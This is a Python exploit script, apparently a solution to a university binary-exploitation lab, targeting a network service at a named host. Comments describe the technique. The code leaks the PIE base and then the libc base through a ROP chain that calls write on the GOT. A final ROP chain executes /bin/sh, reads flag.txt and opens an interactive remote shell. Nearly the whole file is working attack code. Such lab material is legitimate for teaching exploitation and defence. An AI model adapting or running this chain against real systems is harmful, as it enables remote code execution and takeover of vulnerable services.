import sys
import struct
import socket
import signal
import time
from pwn import *

host = "lettieri.iet.unipi.it"
#host = "localhost"
port = 7002

def sendn(conn, buf, n):
    sent = 0
    while sent < n:
        sent += conn.send(buf[sent:])

    #print("Sent {} bytes".format(sent))

def recvn(conn, n):
    buf = b''
    buf = conn.recv(n)

    while len(buf) < n:
        
        b = conn.recv(n - len(buf)) 
        if b == b'':
            #print("loop..")
            break
        buf += conn.recv(n - len(buf)) 
    
    
    #print("Received {} bytes".format(len(buf)))
    return buf

def pack(a):
    return struct.pack("Q", a)

def unpack(a):
    return struct.unpack("Q", a)[0]

def signal_handler(sig, frame):
    print("Exiting ...")
    exit()

#signal.signal(signal.SIGINT, signal_handler)


# this time PIE is enabled. We have to locate the base address of the executable
# In fact, if you look for symbols for instance with nm, you only find offsets, not
# addresses. Even the plt has not addresses, but offsets. So the first thing to do
# is to locate where the binary is loaded in memory.

# This can be achieved using the functions echo and do_stuff. First you have to call
# do_stuff. This function uses SMALL_BUFF and do stuff. The important thing is that
# calling that function will leave its return address on the stack. Then, you can call
# echo, making sure that its read will read LESS THAN MEDIUM_BUF. After, the write will
# of course print till the end of the buffer, revealing the previous return address
# of the do_stuff function. So in this way you can compute where the binary is located.

# then, you can call again do_stuff and try to exploit my_atoi and of course the memset
# to gain control and proceed like in the previous exercise. 


LARGE_BUF =	512
MEDIUM_BUF = 128
SMALL_BUF = 32

with socket.create_connection((host, port)) as conn:

    buf = b"1" + b"\n" # force calling do_stuff
    sendn(conn, buf, len(buf))
    time.sleep(1)

    buf = b"0" + b"\n"
    sendn(conn, buf, len(buf))
    time.sleep(1)

    buf = b"A"*31 + b"\n"
    sendn(conn, buf, len(buf))

    buf = recvn(conn, 128)
    buf = buf[32:]
    n = 8
    buf = [buf[i:i+n] for i in range(0, len(buf), n)]
    
    stack_content = [struct.unpack("Q", buf[i])[0] for i in range(0, len(buf))]

    # the return address of memcpy saved on the stack is shown! 
    # it corresponds to the nop that is present after the memcpy
    base_address = stack_content[3] - 0xc74 # nop offset is 0xc74

    print("Binary base address: {}".format(hex(base_address)))


# now that the base address is computed, we can:
#   1. choose the gadgets
#   2. exploit the memcpy by:
#       2a. controlling the number of the bytes to be copied, exploiting my_atoi
#       2b. creating the ROP chain to leak got a learn libc base address

with socket.create_connection((host, port)) as conn:

    offset_to_rip = 0x38  
    buf = b'512' # to be read by my_atoi
    buf += b"A"*(offset_to_rip - len(buf)) # fill

    # gadgets: I can call write and leak the got again!
    got_offset = 0x201478
    got_address = base_address + got_offset
    #print("Got address {}".format(hex(got_address)))
    write_plt_offset = 0x980
    write_plt_address = base_address + write_plt_offset
    
    gadget1 = 0x0000000000000fab + base_address #: pop rdi; ret; 
    gadget2 = 0x0000000000000fa9 + base_address #: pop rsi; pop r15; ret;

    buf += pack(gadget1)
    buf += pack(0x1) # fd 1
    buf += pack(gadget2)
    buf += pack(got_address)
    buf += b"B"*8
    buf += pack(write_plt_address)
    # in rdx there is already 512

    sendn(conn, buf, len(buf))
    buf = recvn(conn, 512)
    
    setsockopt_address = unpack(buf[0:8])
    

setsockopt_offset = 0x00000000000faa60
libc_base_address = setsockopt_address - setsockopt_offset
print("Libc base address: {}".format(hex(libc_base_address)))


with socket.create_connection((host, port)) as conn:

    p = lambda x : pack(x)
    IMAGE_BASE_0 = libc_base_address 
    rebase_0 = lambda x : pack(x + IMAGE_BASE_0)

    rop = b"512" 
    rop += b"A"*(offset_to_rip - len(rop))

    rop += rebase_0(0x0000000000024209) # 0x0000000000024209: pop r12; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000023f87) # 0x0000000000023f87: pop r13; ret; 
    rop += rebase_0(0x00000000001bb1a0)
    rop += rebase_0(0x000000000008b5b8) # 0x000000000008b5b8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000024209) # 0x0000000000024209: pop r12; ret; 
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000023f87) # 0x0000000000023f87: pop r13; ret; 
    rop += rebase_0(0x00000000001bb1a8)
    rop += rebase_0(0x000000000008b5b8) # 0x000000000008b5b8: mov qword ptr [r13], r12; pop r12; pop r13; pop r14; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000023a5f) # 0x0000000000023a5f: pop rdi; ret; 
    rop += rebase_0(0x00000000001bb1a0)
    rop += rebase_0(0x000000000002440e) # 0x000000000002440e: pop rsi; ret; 
    rop += rebase_0(0x00000000001bb1a8)
    rop += rebase_0(0x0000000000106725) # 0x0000000000106725: pop rdx; ret; 
    rop += rebase_0(0x00000000001bb1a8)
    rop += rebase_0(0x000000000003a638) # 0x000000000003a638: pop rax; ret; 
    rop += p(0x000000000000003b)
    rop += rebase_0(0x00000000000b5b35) # 0x00000000000b5b35: syscall; ret; 
    
    rop += b"B" * (512 - len(rop)) # force the read to end
    
    conn.send(rop)

    print("Wait for flag ...")  
    command = b"/bin/cat flag.txt\n"
    conn.send(command)
    print(conn.recv(4096).decode())

    while True:
        command = input("$ ")
        conn.send(command.encode())
        print(conn.recv(4096).decode())

